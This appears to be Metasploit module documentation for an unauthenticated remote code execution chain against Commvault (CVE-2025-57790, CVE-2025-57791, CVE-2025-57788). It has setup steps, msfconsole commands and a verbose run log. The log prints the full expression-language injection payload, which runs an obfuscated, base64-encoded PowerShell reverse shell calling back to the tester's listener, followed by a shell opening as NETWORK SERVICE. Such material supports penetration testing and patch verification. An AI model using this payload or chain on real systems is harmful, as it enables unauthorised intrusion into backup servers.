## Vulnerable Application
This module exploits an unauthenticated remote code execution exploit chain for Commvault,
tracked as CVE-2025-57790 and CVE-2025-57791. A command-line injection permits unauthenticated
access to the 'localadmin' account, which then facilitates code execution via expression
language injection. CVE-2025-57788 is also leveraged to leak the target host name, which is
necessary knowledge to exploit the remote code execution chain. This module executes in
the context of 'NETWORK SERVICE' on Windows.

## Testing
To set up a test environment:
1. Install Commvault and perform basic minimum setup (prompted by installer).
2. Confirm that the web service on port 443 is reachable.
3. Follow the verification steps below.

## Options
No custom options exist for this module.

## Verification Steps
1. Start msfconsole
2. `use exploit/multi/http/commvault_rce_cve_2025_57790_cve_2025_57791`
3. `set RHOSTS <TARGET_IP_ADDRESS>`
4. `set RPORT <TARGET_PORT>`
5. `run`

## Scenarios
### Commvault Windows Target
```
msf exploit(multi/http/commvault_rce_cve_2025_57790_cve_2025_57791) > show options 

Module options (exploit/multi/http/commvault_rce_cve_2025_57790_cve_2025_57791):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5, socks5h, http, sapni, socks4
   RHOSTS     192.168.154.173  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      443              yes       The target port (TCP)
   SSL        true             yes       Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to Commvault
   VHOST                       no        HTTP server virtual host


Payload options (cmd/windows/powershell_reverse_tcp):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   LHOST         192.168.154.139  yes       The listen address (an interface may be specified)
   LOAD_MODULES                   no        A list of powershell modules separated by a comma to download over the web
   LPORT         4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Default



View the full module info with the info, or info -d command.

msf exploit(multi/http/commvault_rce_cve_2025_57790_cve_2025_57791) > set VERBOSE true
VERBOSE => true
msf exploit(multi/http/commvault_rce_cve_2025_57790_cve_2025_57791) > check
[*] Attempting to query the publicLink.do endpoint
[*] The server returned a body that included the string cv-gorkha, looks like Commvault
[+] Fetched GUID: 572131A8-3182-4423-8850-4A62D6CA2178
[*] Attempting to login as PublicSharingUser
[+] Authenticated as PublicSharingUser, got token: QSDK 34bf02a14954ba56882d9614fb3dfb8d81f8c9f6ae1b180cf7008674f44701dd6e12073182cd57fe736b0dd023e8985feba3ad28fc0d509c6364fe553ddc09ffc05beeeebf0b041baed00d5927ada3d14902085942e84952538dfcee2e69539c76f6e388d8b7ad5c672eab2383f6fbe7760a3061d4b7515ff5320b6169935d239cf9322fa09e0107f0ad5750cf7dfa9eec22e5ff5e46e2e6706ba765cf8b6e059d03e1fd6a86ef6ba50ba229f6217b64a35815a82b2c63347c913d5e66945273ed4d3fcc73dd0a03a119592168550be06
[+] 192.168.154.173:443 - The target is vulnerable. Successfully authenticated as PublicSharingUser
msf exploit(multi/http/commvault_rce_cve_2025_57790_cve_2025_57791) > run
[*] Started reverse TCP handler on 192.168.154.139:4444 
[!] AutoCheck is disabled, proceeding with exploitation
[*] Attempting to query the publicLink.do endpoint
[*] The server returned a body that included the string cv-gorkha, looks like Commvault
[+] Fetched GUID: 572131A8-3182-4423-8850-4A62D6CA2178
[*] Attempting PublicServiceUser login using: 572131A8-3182-4423-8850-4A62D6CA2178
[+] Authenticated as PublicSharingUser, got token: QSDK 3d68d1d2b797e29d96dced010003dc2b8b30c298d87bd24754009afe40bb38921cf7f2e800a4cc43b5c3bda15b06e1a563225a4e08fb4814847ea8f601e9ac6a2405082bf37bcc3d87f493800359c0e0d340b3b12f464b6f1a12756ac218b3e6dc34ebe589b9aca40351512a50d421c9901ebc3952db9c798a3a2d17b94642a7c47861eadd1737666aea2ef49ae62d70efe080f1d6e879bce0dd3dd56cb4f233867a3fa314f192ceb380a5bacefd715ba4e90c4e0a53461ba041c68f183ba771640151f24a508e4ceca6387cec475dd84
[*] Attempting to query authenticated API endpoint to get host name and OS
[+] Got target host name: DC01
[+] Got target host OS: Windows
[*] Attempting to mint a localadmin token using hostname: DC01
[+] Successfully bypassed authentication
[*] Admin token: QSDK 3ec7146da31ce17e7698106e52c813be5d188db27103adf8595059b31935fbe6c1750ca468c2bc02cf514093cb4196f56fd5197bd84c5ca966b803d3b556a2b69be08dae5d4ac3bc7a4e967e2cf94263bb6ce11f4eb02b3f4b70943de18cdd7f21e119493ba98c87bb396f5484f9cd3b08ccbfef3a06b9dc38e20cb7904d4bdd59ea09f6d084c56d2269d0a6a8a4ad96b7c33a2ad18fe1978839494db8b6d6c87205fadab0466cafee879299154c1a40f573d026762c1084c8c65cba0a56efccf3dfe38adc2fb38e09b5c8cfbc22527d13ce872d80b8e3984f89b6e2efd3972384b77d23706264c33c63428ddcea4b9eea8054153c39ab867
[*] Extracted localadmin user ID number: 4
[*] Got JSON response, searching for installation path disclosures
[+] Leaked the installation path: C:\Program Files\Commvault\ContentStore
[*] Uploading XML file: <App_GetUserPropertiesRequest level="30">
	<user userName="DC01_localadmin__" /></App_GetUserPropertiesRequest>
[*] Updating user description: <App_UpdateUserPropertiesRequest><users><AppMsg.UserInfo><userEntity><userId>4</userId></userEntity><description>${''.getClass().forName('java.util.Scanner').getConstructor(''.getClass().forName('java.io.InputStream')).newInstance(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('powershell -w hidden -nop -e YwBtAGQALgBlAHgAZQAgAC8AYwAgACcAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBuAG8AbgBpACAALQBlAHAAIABiAHkAcABhAHMAcwAgACIAJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKAAoACcAJwBIADQAcwBJAEEAUABPAHUAdQAyAGcAQwBBADUAVgBWAFgAVwAvAGIATgBoAFIAOQA5ADYAKwA0AE0ATgBSAEcAUQBtAHoAQwA5AHIAcABoAEQAWgBDAGkAbgBwAG8ATwBBAGIATABXAHEATABMAGwAdwBUAEEAUQBtAHIAcQBPAHQAZABDAGsAUwAxAHsAMgB9AHgAagBjAFQALwBmAGEAUgB7ADEAfQBmAFQAaABPAHMASgBZAFAAdABzAGgANwBlAFgAaAA0ADcAaQBHADUAeQBBAFUAegBtAFIAVAB3AEoANQByACsARABjADQAWgB6ADEAQQBZADYARAB4ADIAdwBMAFoAZwB3ACsAQQBjAHYAdQBDAG0ALwAzAFgAKwAnACcAKwAnACcATAB6AEkARAAvAGUAdgBkAEcAcgAvAFEARgBkAHAAQgBRADIAeAArAFgATwBSAFgAeQBlAFIAdgBqAFoAOQB3AFEAWABOAHUAWQBvAFcAcABqAFcAUwBVAGEAdwBzAFIARwBKAFYAagBuAFQAVgBSAGMAcgBzAGoAegB6AEwAcwBlAEcAdQBrAHkAdQAzAHMATwA0AHUAewAyAH0ANABsAHAAdQBVAE4AbQBlAFoAUQBkAEYAZgB7ADEAfQBJAFYAWABZAFgAbAA5AHoAUQB4AHsAMgB9AGgATgAzAHMAeQBDAFcAcQB4AFUAVgBhAGUAOQB3AE4ATgBHAGMAUwBmAEYAcwA4AEoAUABjAEMAQwA1AHAAVwBvAHgARwBIAGwATgBKAGgAbABxAEQARgAyAEEAbAAwADUAeQBqAEkALwBnAHgAagB7ADIAfQBCAE0AeQBSAFkAUQBWAHMAdABBAEgANwA5AEQAZAA1ADYASgB0AEIAcwBWAHcAWABKAGUATQBaAGQAbgAyAHEAQgBBAFoAUwBkAFAAawA1ADMAOQBYAGgARwBuAFcAaQBMAFoAUABSAHAATgByAHQAbgA2AHkAbQBmAE0AMwB0AGwAMgBQAEoARgBvAFEANQBWAHgANgAvAHEAVgBpADYAZwB2ADAAWABrAHIAYgA4AHcAWQByAG8AMABGAEwATQAnACcAKwAnACcAcwBSAGwAbABUADIAcgA5AEYAVgArAEkAQgB7ADIAfQA0AHoASABqAEcAcgBwAFYAOABwAGUAWQB4AHgATwAvAFUASABmADQAZgBrAFMARwB2AC8AMQBPAGgAcgArACsASQAnACcAKwAnACcAOABOAGYAMwBuAGQANwBiAGkAJwAnACsAJwAnAGQAKwArAFUANABwAG8AVABZAHsAMgB9ADYAYwByAHgATABlAEcASgB0AFYAcABTAGoARgBtAGUARABjAE8AeQBRAGkAVgBCADUANQBhAHUATAAwAGkATABuAHQAWQA4AHEAYwBCAGUAWQBZAGcAcwBWADUAbgBaAGsAYQBSAHsAMgB9AEQAZgAzACcAJwArACcAJwA2AHYAVwBCAGgAYgBZAFcAOQA4AEQARwA0AHQAdQBoADcANgBGAE0ATgAwADQATQA1ADMAMwBBACcAJwArACcAJwBsAEQAYwBhAG8AVABMAGIASQBHAEQAWAA0AEQAKwBWAFoAUwBwADMAMwBZAHMAcgA1AG4ATABMADcAVwBSAFMAOQBRAEkAZQBNAGMANwBOADAAeABuAFcAVAB4AHYAcABWAGIAUQB7ADIAfQBSAGMAOQA3AHIARwBxADYASABvADYANABuADEATQBhAHIAaABXAG8AMgAyAGwAWgB5AE8AdAA4AFoAbgBNADUAbQBnAGYAdAAzAGwAaAB3AFEATQBoAHIAWQA5AHYAVABtAGMAYgBEADMAWQBxAE4ASQBxADMAQQA0AE4AYgBnADEAQgBBAFcAVABxAGYAUAA3ADIAZABrADQAaQBTADgAdgBJADEAZQBBAFAAMQB4AE8AMgBMADIAeAB4AHAAVQBiAEQAJwAnACsAJwAnAFIATgAzAHQASgBJAGwAYwBnADQAcQBGADgASgBtAGcANQBVAG4AMQA5AGEAOABYAFQAaQBGAEEATQBYACcAJwArACcAJwBEAG0AZQBzAEoAZAAvAFIAUAA3AFoAaQB0AFYAQgAxAGcAYwByAFgATwBUAFIATwA4AEYAYgBGAGMANwAxAFIAMgB0AHoAUQBRAHgAaABIADgAbABUAHsAMQB9AGwAdABWAHcAWQBpAHsAMgB9AFYAYQBTADEAVQBvAFMAbQBEAHMARgBuAE4ASgAnACcAKwAnACcARwBoAFIAYQA3AEEAZABNAHkAYQAyADQARgBkADYAVwBYAGcANQB5AFkAMgB1AEQAWQBiAE8AeAAzAHEARABYAGQATQBnAFYAaQAnACcAKwAnACcAagB1AHoAYgBQAHUAbwBPAHQAUgB0AEoAeAAwAFoANgAnACcAKwAnACcAZQBkAFUAbQBwADcATwA0AE0AcABDAE8AbABuADgAaABVAEIAcQBuAGoALwBQAHQAWgByADEAVwBhAG8ATAB5AHAAYQBXAGMAdwBrAHsAMgB9AG0AYQBnAHYAbgBDAGEAcgBvAGUAMQBhAGUASABCAFAAUgA2AFQAYQBiAFgAbQBsAFYAVQBqAFIAMAA2AFYANABrAFAAZgBZAHYAOQBpAHUAcgBiAGIAYQA2AGwAMgBqADcATgB1AFcAMgBpAHcAegBqAG0AewAxAH0AWQBaAEkAWAByAHkAawAxADgAUQA1AHEARwBwAGMAZAA2AE0ATwBoAEIAJwAnACsAJwAnAGMATQBBACsAZwByADUAQQBHAEIAeABKAGUAdQBIADAAdwAvAFQAYQBhAHYAbgBhAGsAKwBIAFAAcQBVAHMAaABoAGMAWQBYAFgAdgBNAEcAeABaADQAMgA2AHEAaQAwADAAUAB4ADEAVQBlAHkAdQB7ADEAfQBoAFcAQwBMAEgAcABXAFQAWABzADQAWABUAEcAUAA5AGcAMwA5ADYAdQBvAHIAdwBVAGMAZgAzAGcANwBoAEMAYgA3AG0AcABsACsAaQBnAGoAZgBQAEEAZABRAEkAQwBrAHsAMQB9AHEANABGAE0ANABtAFMAUgB3AFkAdgA4AEwALwBhADgAawB7ADIAfQB6AHcAYwBrAFEAawAxAFMAeABmADkAQQBDAGMATgB5AE4AWQBSAEMAVgBBAHAAcQBhAGEARAAyAGMARgBpAEwAZABaAEYAbgBEAEMATwBWAEkAWABSAFMAdwB6AE8AMgB4ADEANwAxAEwAYQBkAFkAdwBQAC8AawBIADgAYgBtAFAAOQAxAGIATgB1AHcAUgAzADYAdAA1AG4AegBtAHUAVgA3AFcAcgA2AEcALwBlAFAAegBkAEgAbgBPAHAAMABlACsAbgBPAEkANwBWAEcAOQBVACcAJwArACcAJwAyAFQAUABOAHcASgBVAGEAdQBxADkAZgB7ADIAfQAvADEAcABuADEAZwA5ADkAWABUAHYALwBZAHYAMABIAGQAVwBxADkAewAyAH0AcQA0AEkAQQBBAEEAewAwAH0AJwAnACkALQBmACcAJwA9ACcAJwAsACcAJwBFACcAJwAsACcAJwBLACcAJwApACkAKQApACwAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAKQApACIAJwA=').getInputStream()).useDelimiter('%5C%5CA').next()}</description></AppMsg.UserInfo></users></App_UpdateUserPropertiesRequest>
[*] Powershell session session 1 opened (192.168.154.139:4444 -> 192.168.154.173:50327) at 2025-09-05 22:51:42 -0500
^C
[-] run: Interrupted
msf exploit(multi/http/commvault_rce_cve_2025_57790_cve_2025_57791) > sessions -i 1
[*] Starting interaction with 1...

PS C:\Program Files\Commvault\ContentStore\Apache\bin> whoami
nt authority\network service

```
